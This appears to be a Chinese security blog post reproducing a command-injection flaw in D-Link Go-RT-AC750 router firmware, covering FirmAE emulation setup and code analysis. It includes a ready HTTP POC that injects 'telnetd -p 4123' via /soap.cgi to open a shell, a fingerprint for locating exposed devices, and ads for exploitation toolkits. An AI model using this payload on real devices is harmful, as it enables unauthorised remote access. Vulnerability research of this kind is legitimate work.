<meta name="referrer" content="no-referrer"/>
> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/AO-5oW8Qs5AM3MmvAF_miQ)

**漏洞介绍**

D-Link Go-RT-AC750 在固件版本为 revA_v101b03 中存在命令注入漏洞，攻击者可以请求 /soap.cgi 路由通过携带的参数进行命令拼接。

**仿真环境搭建**
----------

安装 FirmAE 工具仓库

git clone --recursive https://github.com/pr0v3rbs/FirmAE

运行下载脚本

cd FirmAE/

./download.sh #下载用到的包

![](https://mmbiz.qpic.cn/sz_mmbiz_png/9zZrDr2DM8PrNrBMSXD19q4XEfXKfvBOIHcR7cTn7GjoM4FxlXnSpwkL6hTR6Gyia4FvovbvictlQibId0gl1vSMA/640?wx_fmt=png)

运行./install.sh 进行安装

![](https://mmbiz.qpic.cn/sz_mmbiz_png/9zZrDr2DM8PrNrBMSXD19q4XEfXKfvBOUA08GO4E4QGAjSicuRPGE8xJt5BFRQZf6yEG1icoGuicaCdXyv5QrJpHg/640?wx_fmt=png)

运行 init.sh 进行初始化

![](https://mmbiz.qpic.cn/sz_mmbiz_png/9zZrDr2DM8PrNrBMSXD19q4XEfXKfvBOr9PUhvDLXav0YbpibfeFYibGkibYKHokfFkggs7qXLe0pee1ZYS04uib6w/640?wx_fmt=png)

正常运行起来如下图（注意路径中不要包含中文）：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/9zZrDr2DM8PrNrBMSXD19q4XEfXKfvBOrwHgK99V27VbPYG1BZIHgJJgl0GZtmjia4SnEGsI3EYSWHYyUoyZIjA/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/9zZrDr2DM8PrNrBMSXD19q4XEfXKfvBOKxric5S9mvSkSbmnzEic3Wic49uwh8ZcGXMpCBXoUHicZia0DAAbs9NYE9g/640?wx_fmt=png)

**代码分析**
--------

逻辑很简单，可以看到 v14 取决于 v10,v10 取决于 v9 也就是 v3 中? 后面的内容，然后 v3 取决于 REQUEST_URI。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/9zZrDr2DM8PrNrBMSXD19q4XEfXKfvBOELu5LXiaW2nmZhJdeDLiba41xfYA868v241QNXSA6Up1iaH9UxogSERuA/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/9zZrDr2DM8PrNrBMSXD19q4XEfXKfvBOkicf9RBZSUrqAv1RzcoAs8KjaNytrEFHauD3uA0BiaY12BsHyUOLSPhg/640?wx_fmt=png)

进入命令执行的条件

1、Content-Type: text/xml

2、SOAPAction: "a#b"

也可以借助 gpt 来分析条件，如下写的很明白。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/9zZrDr2DM8PrNrBMSXD19q4XEfXKfvBO6BdmYFx1cpglZt6a4NuWYTY1EkibJAqcOvsoFkCC4icPtfbemsppPfOg/640?wx_fmt=png)

**漏洞复现**
--------

**指纹: web.body="/pic/tail.gif"(随便提的)**

![](https://mmbiz.qpic.cn/sz_mmbiz_png/9zZrDr2DM8PrNrBMSXD19q4XEfXKfvBOIf9sBSNq49a3nEaZciccXPYoiaORDVWokWbxpWrohbS0wPKpUohzNnZw/640?wx_fmt=png)

**POC:**

POST /soap.cgi?service=;telnetd -p 4123& HTTP/1.1

Host: xxx.xxx.x.x:49152

User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:88.0) Gecko/20100101 Firefox/88.0

SOAPAction: "a#b"

Content-Length: 0

Content-Type: text/xml

![](https://mmbiz.qpic.cn/sz_mmbiz_png/9zZrDr2DM8PrNrBMSXD19q4XEfXKfvBOEUSblwRv9JpxfoOXT0OCMpWLMG7Bw2Y6DTfVx2mSXzHHZTz5gUTzIw/640?wx_fmt=png)

telnet x.x.x.x 4123 成功获取到 shell

![](https://mmbiz.qpic.cn/sz_mmbiz_png/9zZrDr2DM8PrNrBMSXD19q4XEfXKfvBOz30BwU7k3RG2jPwDuulEQRmrfYhHKG42nhjBfHqy5dxnQqgqYqAkog/640?wx_fmt=png)

**总结  
**
---------

  

这个命令执行漏洞挺经典的，总结不知道总结啥，凑凑字数，没啥，就是很常规的操作。对了，分析的时候可以借助一下 gpt，挺高效率，不过注意问问题的方式，别被 gpt 带偏了，去引导它。

**资源下载  
**
-----------

  

1、公众号后台回复：**jboss**，获取 **jboss 综合利用工具**网盘下载链接。  
2、公众号后台回复：**ru****oyi**，获取 **ruoyi 综合利用工具**网盘下载链接。  
3、公众号后台回复：**postgresql**，获取 **postgresql 综合利用工具**网盘下载链接  
4、公众号后台回复：**ecologySession**，获取 **ecology 任意用户登录小工具**网盘下载链接

5、公众号回复：**资料**，获取**代码审计，红队，物联网安全，漏洞挖掘**相关整合资料。